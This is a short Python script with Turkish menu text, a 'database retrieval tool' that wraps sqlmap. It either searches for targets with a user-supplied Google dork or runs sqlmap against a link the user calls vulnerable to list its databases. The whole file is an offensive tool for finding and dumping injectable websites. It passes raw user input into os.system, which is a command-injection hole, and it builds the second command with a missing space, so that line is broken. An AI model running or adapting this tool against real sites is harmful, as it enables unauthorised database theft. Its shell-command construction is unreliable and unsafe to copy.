import os
print("Veri Tabani Alma Araci")
print("""
[1]Dork Tara
[2]Açıklı Link Biliyorum
""")
islemno = input("islem no:")
if(islemno=="1"):
	os.system("clear")
	dork=input("Dork Giriniz: ")
	os.system("sqlmap -g"+dork)
elif(islemno=="2"):
	print("islem2")
	os.system("clear")
	aciklink = input("Link: ")
	os.system("sqlmap -u"+aciklink+"--dbs")
	